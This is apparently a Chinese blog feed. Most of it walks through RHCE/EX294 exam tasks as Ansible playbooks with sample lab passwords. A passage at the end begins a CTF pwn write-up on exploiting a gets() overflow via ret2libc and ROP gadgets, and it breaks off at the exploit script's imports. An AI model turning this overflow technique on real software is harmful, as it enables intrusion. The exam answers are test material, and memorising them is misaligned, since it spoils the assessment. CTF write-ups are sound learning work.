使用RHEL系统角色</h2><p><img src="/2023/01/03/rhcsa-rhce%E9%80%9A%E5%85%B3%E6%94%BB%E7%95%A5/1677055978924.png" alt="1677055978924"></p><p>先 <code>sudo yum install -y rhel-system-roles</code></p><p>然后再在ansible.cfg里roles_path加上/usr/share/ansible/roles，用冒号隔开（我上面写的已经包含这个了）</p><p>timesync.tml为</p><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">name:</span> <span class="string">use</span> <span class="string">timesyn</span> <span class="string">role</span></span><br><span class="line">  <span class="attr">hosts:</span> <span class="string">all</span></span><br><span class="line">  <span class="attr">vars:</span></span><br><span class="line">    <span class="attr">timesync_ntp_servers:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">hostname:</span> <span class="number">172.25</span><span class="number">.254</span><span class="number">.254</span></span><br><span class="line">        <span class="attr">iburst:</span> <span class="literal">yes</span></span><br><span class="line">  <span class="attr">roles:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">rhel-system-roles.timesync</span></span><br></pre></td></tr></table></figure><p>selinux.yml为</p><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">name:</span> <span class="string">use</span> <span class="string">selinux</span> <span class="string">role</span></span><br><span class="line">  <span class="attr">hosts:</span> <span class="string">all</span></span><br><span class="line">  <span class="attr">vars:</span></span><br><span class="line">    <span class="attr">selinux_policy:</span> <span class="string">targeted</span></span><br><span class="line">    <span class="attr">selinux_state:</span> <span class="string">enforcing</span></span><br><span class="line">  <span class="attr">roles:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">rhel-system-roles.selinux</span></span><br></pre></td></tr></table></figure><h2 id="5-使用ansible-Galaxy安装角色"><a href="#5-使用ansible-Galaxy安装角色" class="headerlink" title="5. 使用ansible Galaxy安装角色"></a>5. 使用ansible Galaxy安装角色</h2><p><img src="/2023/01/03/rhcsa-rhce%E9%80%9A%E5%85%B3%E6%94%BB%E7%95%A5/1677056175286.png" alt="1677056175286"></p><p>requirements.yml为</p><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="bullet">-</span> <span class="attr">src:</span> <span class="string">http://rhgls.domainx.example.com/materials/haproxy.tar</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">balancer</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">src:</span> <span class="string">http://rhgls.domainx.example.com/materials/phpinfo.tar</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">phpinfo</span></span><br></pre></td></tr></table></figure><p>然后ansible-galgxy install -r requirements.yml，即可发现在roles下面多了两个角色</p><p>使用ansible-galaxy list可以看到</p><h2 id="6-创建一个web-role"><a href="#6-创建一个web-role" class="headerlink" title="6. 创建一个web role"></a>6. 创建一个web role</h2><p><img src="/2023/01/03/rhcsa-rhce%E9%80%9A%E5%85%B3%E6%94%BB%E7%95%A5/1677056281705.png" alt="1677056281705"></p><p>在roles里使用</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ansible-galaxy init apache</span><br></pre></td></tr></table></figure><p>然后编辑roles/apache/template/index.html.j2为</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Welcome to &#123;&#123; ansible_fqdn &#125;&#125; on &#123;&#123; ansible_default_ipv4.address &#125;&#125;</span><br></pre></td></tr></table></figure><p>在然后编辑roles/apache/tasks/main.yml为</p><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="bullet">-</span> <span class="attr">name:</span> <span class="string">install</span> <span class="string">httpd</span></span><br><span class="line">  <span class="attr">yum:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">httpd</span></span><br><span class="line">    <span class="attr">state:</span> <span class="string">latest</span></span><br><span class="line"></span><br><span class="line"><span class="bullet">-</span> <span class="attr">name:</span> <span class="string">enable</span> <span class="string">httpd</span></span><br><span class="line">  <span class="attr">service:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">httpd</span></span><br><span class="line">    <span class="attr">state:</span> <span class="string">started</span></span><br><span class="line">    <span class="attr">enabled:</span> <span class="literal">yes</span></span><br><span class="line"></span><br><span class="line"><span class="bullet">-</span> <span class="attr">name:</span> <span class="string">enable</span> <span class="string">firewalld</span></span><br><span class="line">  <span class="attr">service:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">firewalld</span></span><br><span class="line">    <span class="attr">state:</span> <span class="string">started</span></span><br><span class="line">    <span class="attr">enabled:</span> <span class="literal">yes</span></span><br><span class="line"></span><br><span class="line"><span class="bullet">-</span> <span class="attr">name:</span> <span class="string">set</span> <span class="string">firewalld</span></span><br><span class="line">  <span class="attr">firewalld:</span></span><br><span class="line">    <span class="attr">service:</span> <span class="string">http</span></span><br><span class="line">    <span class="attr">immediate:</span> <span class="literal">yes</span></span><br><span class="line">    <span class="attr">permanent:</span> <span class="literal">yes</span></span><br><span class="line">    <span class="attr">state:</span> <span class="string">enabled</span></span><br><span class="line"></span><br><span class="line"><span class="bullet">-</span> <span class="attr">name:</span> <span class="string">set</span> <span class="string">web</span> <span class="string">content</span></span><br><span class="line">  <span class="attr">template:</span></span><br><span class="line">    <span class="attr">src:</span> <span class="string">index.html.j2</span></span><br><span class="line">    <span class="attr">dest:</span> <span class="string">/var/www/html/index.html</span></span><br></pre></td></tr></table></figure><p>然后编辑apache.yml为</p><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">name:</span> <span class="string">use</span> <span class="string">apache</span></span><br><span class="line">  <span class="attr">hosts:</span> <span class="string">webservers</span></span><br><span class="line">  <span class="attr">roles:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">apache</span></span><br></pre></td></tr></table></figure><h2 id="7-从ansible-Galaxy使用角色"><a href="#7-从ansible-Galaxy使用角色" class="headerlink" title="7. 从ansible Galaxy使用角色"></a>7. 从ansible Galaxy使用角色</h2><p><img src="/2023/01/03/rhcsa-rhce%E9%80%9A%E5%85%B3%E6%94%BB%E7%95%A5/1677056520195.png" alt="1677056520195"></p><p>编辑roles.tml</p><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">name:</span> <span class="string">use</span> <span class="string">haproxy</span></span><br><span class="line">  <span class="attr">hosts:</span> <span class="string">balancers</span></span><br><span class="line">  <span class="attr">roles:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">balancer</span></span><br><span class="line">  <span class="attr">tasks:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">set</span> <span class="string">firewall</span></span><br><span class="line">      <span class="attr">firewalld:</span></span><br><span class="line">        <span class="attr">service:</span> <span class="string">http</span></span><br><span class="line">        <span class="attr">permanent:</span> <span class="literal">yes</span></span><br><span class="line">        <span class="attr">immediate:</span> <span class="literal">yes</span></span><br><span class="line">        <span class="attr">state:</span> <span class="string">enabled</span></span><br><span class="line"></span><br><span class="line"><span class="bullet">-</span> <span class="attr">name:</span> <span class="string">use</span> <span class="string">phoinfo</span> <span class="string">role</span></span><br><span class="line">  <span class="attr">hosts:</span> <span class="string">webservers</span></span><br><span class="line">  <span class="attr">roles:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">phpinfo</span></span><br></pre></td></tr></table></figure><h2 id="8-创建和使用逻辑卷"><a href="#8-创建和使用逻辑卷" class="headerlink" title="8. 创建和使用逻辑卷"></a>8. 创建和使用逻辑卷</h2><p><img src="/2023/01/03/rhcsa-rhce%E9%80%9A%E5%85%B3%E6%94%BB%E7%95%A5/1677059581021.png" alt="1677059581021"></p><p>编辑lv.yml</p><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">name:</span> <span class="string">create</span> <span class="string">lv</span></span><br><span class="line">  <span class="attr">hosts:</span> <span class="string">all</span></span><br><span class="line">  <span class="attr">tasks:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">block:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">create</span> <span class="string">lv</span> <span class="string">of</span> <span class="string">1500m</span></span><br><span class="line">          <span class="attr">lvol:</span></span><br><span class="line">            <span class="attr">vg:</span> <span class="string">research</span></span><br><span class="line">            <span class="attr">lv:</span> <span class="string">data</span></span><br><span class="line">            <span class="attr">size:</span> <span class="number">1500</span></span><br><span class="line"></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">format</span> <span class="string">ext4</span> <span class="string">fs</span></span><br><span class="line">          <span class="attr">filesystem:</span></span><br><span class="line">            <span class="attr">fstype:</span> <span class="string">ext4</span></span><br><span class="line">            <span class="attr">dev:</span> <span class="string">/dev/research/data</span></span><br><span class="line">      <span class="attr">rescue:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">out</span> <span class="string">put</span> <span class="string">info</span> </span><br><span class="line">          <span class="attr">debug:</span></span><br><span class="line">            <span class="attr">msg:</span> <span class="string">&#x27;Could not create logical volume of that size&#x27;</span></span><br><span class="line">          <span class="attr">when:</span> <span class="string">&quot;ansible_lvm.vgs.research is defined&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">create</span> <span class="string">lv</span> <span class="string">of</span> <span class="string">800m</span></span><br><span class="line">          <span class="attr">lvol:</span></span><br><span class="line">            <span class="attr">vg:</span> <span class="string">research</span></span><br><span class="line">            <span class="attr">lv:</span> <span class="string">data</span></span><br><span class="line">            <span class="attr">size:</span> <span class="number">800</span></span><br><span class="line">          <span class="attr">when:</span> <span class="string">&quot;ansible_lvm.vgs.research is defined&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">format</span></span><br><span class="line">          <span class="attr">filesystem:</span></span><br><span class="line">            <span class="attr">fstype:</span> <span class="string">ext4</span></span><br><span class="line">            <span class="attr">dev:</span> <span class="string">/dev/research/data</span></span><br><span class="line">          <span class="attr">when:</span> <span class="string">&quot;ansible_lvm.vgs.research is defined&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">output</span> <span class="string">info</span></span><br><span class="line">          <span class="attr">debug:</span></span><br><span class="line">            <span class="attr">msg:</span> <span class="string">Volume</span> <span class="string">group</span> <span class="string">does</span> <span class="string">not</span> <span class="string">exist</span></span><br><span class="line">          <span class="attr">when:</span> <span class="string">&quot;ansible_lvm.vgs.research is undefined&quot;</span></span><br></pre></td></tr></table></figure><h2 id="9-生成主机文件"><a href="#9-生成主机文件" class="headerlink" title="9. 生成主机文件"></a>9. 生成主机文件</h2><p><img src="/2023/01/03/rhcsa-rhce%E9%80%9A%E5%85%B3%E6%94%BB%E7%95%A5/1677059671001.png" alt="1677059671001"></p><p>下载hosts.j2后编辑</p><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> <span class="string">localhost</span> <span class="string">localhost.localdomain</span> <span class="string">localhost4</span> <span class="string">localhost4.localdomain4</span></span><br><span class="line"><span class="string">::1</span> <span class="string">localhost</span> <span class="string">localhost.localdomain</span> <span class="string">localhost6</span> <span class="string">localhost6.localdomain6</span></span><br><span class="line">&#123;<span class="string">%</span> <span class="string">for</span> <span class="string">host</span> <span class="string">in</span> <span class="string">groups.all</span> <span class="string">%</span>&#125;</span><br><span class="line">&#123;&#123; <span class="string">hostvars</span>[<span class="string">host</span>]<span class="string">.ansible_default_ipv4.address</span> &#125;&#125; &#123;&#123; <span class="string">hostvars</span>[<span class="string">host</span>]<span class="string">.ansible_fqdn</span> &#125;&#125; &#123;&#123; <span class="string">hostvars</span>[<span class="string">host</span>]<span class="string">.ansible_hostname</span> &#125;&#125;</span><br><span class="line">&#123;<span class="string">%</span> <span class="string">endfor</span> <span class="string">%</span>&#125;</span><br></pre></td></tr></table></figure><p>编辑hosts.yml</p><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">name:</span> <span class="string">create</span> <span class="string">hsot</span></span><br><span class="line">  <span class="attr">hosts:</span> <span class="string">all</span></span><br><span class="line">  <span class="attr">tasks:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">use</span> <span class="string">template</span></span><br><span class="line">      <span class="attr">template:</span></span><br><span class="line">        <span class="attr">src:</span> <span class="string">hosts.j2</span></span><br><span class="line">        <span class="attr">dest:</span> <span class="string">/etc/myhosts</span></span><br><span class="line">      <span class="attr">when:</span> <span class="string">&quot;&#x27;dev&#x27; in group_names&quot;</span></span><br></pre></td></tr></table></figure><h2 id="10-修改文件内容"><a href="#10-修改文件内容" class="headerlink" title="10. 修改文件内容"></a>10. 修改文件内容</h2><p><img src="/2023/01/03/rhcsa-rhce%E9%80%9A%E5%85%B3%E6%94%BB%E7%95%A5/1677059760691.png" alt="1677059760691"></p><p>编辑issue.yml</p><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">name:</span> <span class="string">mod</span> <span class="string">file</span> <span class="string">content</span></span><br><span class="line">  <span class="attr">hosts:</span> <span class="string">all</span></span><br><span class="line">  <span class="attr">tasks:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">copy:</span></span><br><span class="line">        <span class="attr">content:</span> <span class="string">Development</span></span><br><span class="line">        <span class="attr">dest:</span> <span class="string">/etc/issue</span></span><br><span class="line">      <span class="attr">when:</span> <span class="string">&#x27;&quot;dev&quot; in group_names&#x27;</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">copy:</span></span><br><span class="line">        <span class="attr">content:</span> <span class="string">Test</span></span><br><span class="line">        <span class="attr">dest:</span> <span class="string">/etc/issue</span></span><br><span class="line">      <span class="attr">when:</span> <span class="string">&#x27;&quot;test&quot; in group_names&#x27;</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">copy:</span></span><br><span class="line">        <span class="attr">content:</span> <span class="string">Production</span></span><br><span class="line">        <span class="attr">dest:</span> <span class="string">/etc/issue</span></span><br><span class="line">      <span class="attr">when:</span> <span class="string">&#x27;&quot;prod&quot; in group_names&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="11-创建web内容目录"><a href="#11-创建web内容目录" class="headerlink" title="11. 创建web内容目录"></a>11. 创建web内容目录</h2><p><img src="/2023/01/03/rhcsa-rhce%E9%80%9A%E5%85%B3%E6%94%BB%E7%95%A5/1677059824499.png" alt="1677059824499"></p><p>编辑webcontent.yml</p><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">name:</span> <span class="string">set</span> <span class="string">web</span> <span class="string">content</span></span><br><span class="line">  <span class="attr">hosts:</span> <span class="string">dev</span></span><br><span class="line">  <span class="attr">tasks:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">create</span> <span class="string">directory</span></span><br><span class="line">      <span class="attr">file:</span></span><br><span class="line">        <span class="attr">path:</span> <span class="string">/webdev</span></span><br><span class="line">        <span class="attr">state:</span> <span class="string">directory</span></span><br><span class="line">        <span class="attr">group:</span> <span class="string">webdev</span></span><br><span class="line">        <span class="attr">mode:</span> <span class="string">&quot;2775&quot;</span></span><br><span class="line">        <span class="attr">setype:</span> <span class="string">&quot;httpd_sys_content_t&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">create</span> <span class="string">soft</span> <span class="string">link</span></span><br><span class="line">      <span class="attr">file:</span></span><br><span class="line">        <span class="attr">src:</span> <span class="string">/webdev</span></span><br><span class="line">        <span class="attr">dest:</span> <span class="string">/var/www/html/webdev</span></span><br><span class="line">        <span class="attr">state:</span> <span class="string">link</span></span><br><span class="line"></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">set</span> <span class="string">web</span> <span class="string">content</span></span><br><span class="line">      <span class="attr">copy:</span></span><br><span class="line">        <span class="attr">content:</span> <span class="string">Development</span></span><br><span class="line">        <span class="attr">dest:</span> <span class="string">/webdev/index.html</span></span><br><span class="line">        <span class="attr">setype:</span> <span class="string">&quot;httpd_sys_content_t&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">start</span> <span class="string">httpd</span> <span class="string">service</span></span><br><span class="line">      <span class="attr">service:</span></span><br><span class="line">        <span class="attr">name:</span> <span class="string">httpd</span></span><br><span class="line">        <span class="attr">state:</span> <span class="string">started</span></span><br><span class="line">        <span class="attr">enabled:</span> <span class="literal">yes</span></span><br><span class="line"></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">set</span> <span class="string">firewalld</span></span><br><span class="line">      <span class="attr">firewalld:</span></span><br><span class="line">        <span class="attr">service:</span> <span class="string">http</span></span><br><span class="line">        <span class="attr">permanent:</span> <span class="literal">yes</span></span><br><span class="line">        <span class="attr">immediate:</span> <span class="literal">yes</span></span><br><span class="line">        <span class="attr">state:</span> <span class="string">enabled</span></span><br></pre></td></tr></table></figure><h2 id="12-生成硬件报告"><a href="#12-生成硬件报告" class="headerlink" title="12. 生成硬件报告"></a>12. 生成硬件报告</h2><p><img src="/2023/01/03/rhcsa-rhce%E9%80%9A%E5%85%B3%E6%94%BB%E7%95%A5/1677059894766.png" alt="1677059894766"></p><p>编辑hwreport.yml</p><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">name:</span> <span class="string">create</span> <span class="string">hw</span> <span class="string">report</span></span><br><span class="line">  <span class="attr">hosts:</span> <span class="string">all</span></span><br><span class="line">  <span class="attr">vars:</span></span><br><span class="line">    <span class="attr">hardware:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">hw_name:</span> <span class="string">HOST</span></span><br><span class="line">        <span class="attr">hw_info:</span> <span class="string">&quot;<span class="template-variable">&#123;&#123; ansible_hostname &#125;&#125;</span>&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">hw_name:</span> <span class="string">MEMORY</span></span><br><span class="line">        <span class="attr">hw_info:</span> <span class="string">&quot;<span class="template-variable">&#123;&#123; ansible_memtotal_mb &#125;&#125;</span>&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">hw_name:</span> <span class="string">BIOS</span></span><br><span class="line">        <span class="attr">hw_info:</span> <span class="string">&quot;<span class="template-variable">&#123;&#123; ansible_bios_version &#125;&#125;</span>&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">hw_name:</span> <span class="string">DISK_SIZE_VDA</span></span><br><span class="line">        <span class="attr">hw_info:</span> <span class="string">&quot;<span class="template-variable">&#123;&#123; ansible_devices.vda.size | default(&#x27;NONE&#x27;) &#125;&#125;</span>&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">hw_name:</span> <span class="string">DISK_SIZE_VDB</span></span><br><span class="line">        <span class="attr">hw_info:</span> <span class="string">&quot;<span class="template-variable">&#123;&#123; ansible_devices.vdb.size | default(&#x27;NONE&#x27;) &#125;&#125;</span>&quot;</span></span><br><span class="line">  <span class="attr">tasks:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">get</span> <span class="string">empty</span> <span class="string">from</span> <span class="string">url</span></span><br><span class="line">      <span class="attr">get_url:</span></span><br><span class="line">        <span class="attr">url:</span> <span class="string">http://rhgls.domainx.example.com/materials/hwreport.empty</span></span><br><span class="line">        <span class="attr">dest:</span> <span class="string">/root/hwreport.txt</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">set</span> <span class="string">hw</span> <span class="string">report</span> <span class="string">content</span></span><br><span class="line">      <span class="attr">lineinfile:</span></span><br><span class="line">        <span class="attr">path:</span> <span class="string">/root/hwreport.txt</span></span><br><span class="line">        <span class="attr">regexp:</span> <span class="string">&quot;^<span class="template-variable">&#123;&#123; item.hw_name &#125;&#125;</span>=&quot;</span></span><br><span class="line">        <span class="attr">line:</span> <span class="string">&quot;<span class="template-variable">&#123;&#123; item.hw_name &#125;&#125;</span>=<span class="template-variable">&#123;&#123; item.hw_info &#125;&#125;</span>&quot;</span></span><br><span class="line">      <span class="attr">loop:</span> <span class="string">&quot;<span class="template-variable">&#123;&#123; hardware &#125;&#125;</span>&quot;</span></span><br></pre></td></tr></table></figure><h2 id="13-使用ansible-vault"><a href="#13-使用ansible-vault" class="headerlink" title="13. 使用ansible-vault"></a>13. 使用ansible-vault</h2><p><img src="/2023/01/03/rhcsa-rhce%E9%80%9A%E5%85%B3%E6%94%BB%E7%95%A5/1677059972883.png" alt="1677059972883"></p><p>编辑secret.txt</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pw_developer: Imadev</span><br><span class="line">pw_manager: Imamgr</span><br></pre></td></tr></table></figure><p>编辑locker.txt</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">whenyouwishuponastar</span><br></pre></td></tr></table></figure><p>使用ansible-vault</p><p><code>ansible-vault encrypt --vault-id=secret.txt locker.yml</code></p><h2 id="14-批量添加用户role"><a href="#14-批量添加用户role" class="headerlink" title="14. 批量添加用户role"></a>14. 批量添加用户role</h2><p><img src="/2023/01/03/rhcsa-rhce%E9%80%9A%E5%85%B3%E6%94%BB%E7%95%A5/1677060158600.png" alt="1677060158600"></p><p>编辑users.yml</p><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">name:</span> <span class="string">create</span> <span class="string">user</span> <span class="string">on</span> <span class="string">dev</span> <span class="string">and</span> <span class="string">test</span></span><br><span class="line">  <span class="attr">hosts:</span> <span class="string">dev,test</span></span><br><span class="line">  <span class="attr">vars_files:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">locker.yml</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">user_list.yml</span></span><br><span class="line">  <span class="attr">tasks:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">create</span> <span class="string">group</span></span><br><span class="line">      <span class="attr">group:</span></span><br><span class="line">        <span class="attr">name:</span> <span class="string">devops</span></span><br><span class="line">        <span class="attr">state:</span> <span class="string">present</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">create</span> <span class="string">user</span></span><br><span class="line">      <span class="attr">user:</span></span><br><span class="line">        <span class="attr">name:</span> <span class="string">&quot;<span class="template-variable">&#123;&#123; item.name &#125;&#125;</span>&quot;</span></span><br><span class="line">        <span class="attr">password:</span> <span class="string">&quot;<span class="template-variable">&#123;&#123; pw_developer | password_hash(&#x27;sha512&#x27;,&#x27;mysecretsalt&#x27;) &#125;&#125;</span>&quot;</span></span><br><span class="line">        <span class="attr">expires:</span> <span class="string">&quot;<span class="template-variable">&#123;&#123; item.password_expire_MAX &#125;&#125;</span>&quot;</span></span><br><span class="line">        <span class="attr">groups:</span> <span class="string">devops</span></span><br><span class="line">      <span class="attr">loop:</span> <span class="string">&quot;<span class="template-variable">&#123;&#123; users &#125;&#125;</span>&quot;</span></span><br><span class="line">      <span class="attr">when:</span> <span class="string">item.job</span> <span class="string">==</span> <span class="string">&#x27;developer&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="bullet">-</span> <span class="attr">name:</span> <span class="string">create</span> <span class="string">user</span> <span class="string">on</span> <span class="string">prod</span></span><br><span class="line">  <span class="attr">hosts:</span> <span class="string">prod</span></span><br><span class="line">  <span class="attr">vars_files:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">locker.yml</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">user_list.yml</span></span><br><span class="line">  <span class="attr">tasks:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">create</span> <span class="string">group</span></span><br><span class="line">      <span class="attr">group:</span></span><br><span class="line">        <span class="attr">name:</span> <span class="string">opsmgr</span></span><br><span class="line">        <span class="attr">state:</span> <span class="string">present</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">create</span> <span class="string">user</span></span><br><span class="line">      <span class="attr">user:</span></span><br><span class="line">        <span class="attr">name:</span> <span class="string">&quot;<span class="template-variable">&#123;&#123; item.name &#125;&#125;</span>&quot;</span></span><br><span class="line">        <span class="attr">password:</span> <span class="string">&quot;<span class="template-variable">&#123;&#123; pw_manager | password_hash(&#x27;sha512&#x27;,&#x27;mysecretsalt&#x27;) &#125;&#125;</span>&quot;</span></span><br><span class="line">        <span class="attr">expires:</span> <span class="string">&quot;<span class="template-variable">&#123;&#123; item.password_expire_MAX &#125;&#125;</span>&quot;</span></span><br><span class="line">        <span class="attr">groups:</span> <span class="string">opsmgr</span></span><br><span class="line">        <span class="attr">uid:</span> <span class="number">6666</span></span><br><span class="line">      <span class="attr">loop:</span> <span class="string">&quot;<span class="template-variable">&#123;&#123; users &#125;&#125;</span>&quot;</span></span><br><span class="line">      <span class="attr">when:</span> <span class="string">item.job</span> <span class="string">==</span> <span class="string">&#x27;manager&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="15-重新设置ansible-vault密码"><a href="#15-重新设置ansible-vault密码" class="headerlink" title="15. 重新设置ansible vault密码"></a>15. 重新设置ansible vault密码</h2><p><img src="/2023/01/03/rhcsa-rhce%E9%80%9A%E5%85%B3%E6%94%BB%E7%95%A5/1677060334911.png" alt="1677060334911"></p><p>下载salaries.yml然后</p><p><code>ansible-vault rekey salaries.yml</code></p><p>修改即可</p><h2 id="16-创建定时任务"><a href="#16-创建定时任务" class="headerlink" title="16. 创建定时任务"></a>16. 创建定时任务</h2><p><img src="/2023/01/03/rhcsa-rhce%E9%80%9A%E5%85%B3%E6%94%BB%E7%95%A5/1677060392162.png" alt="1677060392162"></p><p>编辑cron.yml</p><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="bullet">-</span> <span class="attr">name:</span> <span class="string">set</span> <span class="string">cron</span></span><br><span class="line">  <span class="attr">hosts:</span> <span class="string">all</span></span><br><span class="line">  <span class="attr">tasks:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">user:</span></span><br><span class="line">        <span class="attr">name:</span> <span class="string">natasha</span></span><br><span class="line">        <span class="attr">state:</span> <span class="string">present</span></span><br><span class="line"></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">cron:</span></span><br><span class="line">        <span class="attr">user:</span> <span class="string">natasha</span></span><br><span class="line">        <span class="attr">job:</span> <span class="string">&#x27;Logger &quot;EX294 in progress&quot;&#x27;</span></span><br><span class="line">        <span class="attr">minute:</span> <span class="string">&quot;*/2&quot;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>BUU刷题日记_ciscn2019c1</title>
    <link href="https://blog.pillar.fun/2022/09/22/BUU%E5%88%B7%E9%A2%98%E6%97%A5%E8%AE%B0-ciscn2019c1/"/>
    <id>https://blog.pillar.fun/2022/09/22/BUU%E5%88%B7%E9%A2%98%E6%97%A5%E8%AE%B0-ciscn2019c1/</id>
    <published>2022-09-22T10:49:19.000Z</published>
    <updated>2023-03-14T09:09:44.950Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="导语"><a href="#导语" class="headerlink" title="导语"></a>导语</h1><p>pillar的刷题日记</p><h1 id="ciscn2019c1"><a href="#ciscn2019c1" class="headerlink" title="ciscn2019c1"></a>ciscn2019c1</h1><p>首先checksec，64位，开启了NX</p><p><img src="/2022/09/22/BUU%E5%88%B7%E9%A2%98%E6%97%A5%E8%AE%B0-ciscn2019c1/1.jpg" alt="img"></p><p>然后运行一下</p><p><img src="/2022/09/22/BUU%E5%88%B7%E9%A2%98%E6%97%A5%E8%AE%B0-ciscn2019c1/2.jpg" alt="img"></p><p>是一个加密解密的东西。用ida打开，shift+F12，没有可看到 bin/sh/。读一读代码，在encrypt过程里找到了gets()，可以溢出。</p><p><img src="/2022/09/22/BUU%E5%88%B7%E9%A2%98%E6%97%A5%E8%AE%B0-ciscn2019c1/3.jpg" alt="img"></p><p>由于没有现成的/bin/sh，也没有system函数，所以我们利用gets函数来实现ret2libc</p><p><img src="/2022/09/22/BUU%E5%88%B7%E9%A2%98%E6%97%A5%E8%AE%B0-ciscn2019c1/4.jpg" alt="img"></p><p>利用ROPgadget找到ret和pop rdi的地址</p><p><img src="/2022/09/22/BUU%E5%88%B7%E9%A2%98%E6%97%A5%E8%AE%B0-ciscn2019c1/5.jpg" alt="img"></p><p><img src="/2022/09/22/BUU%E5%88%B7%E9%A2%98%E6%97%A5%E8%AE%B0-ciscn2019c1/6.jpg" alt="img"></p><p>exp</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.os=<span 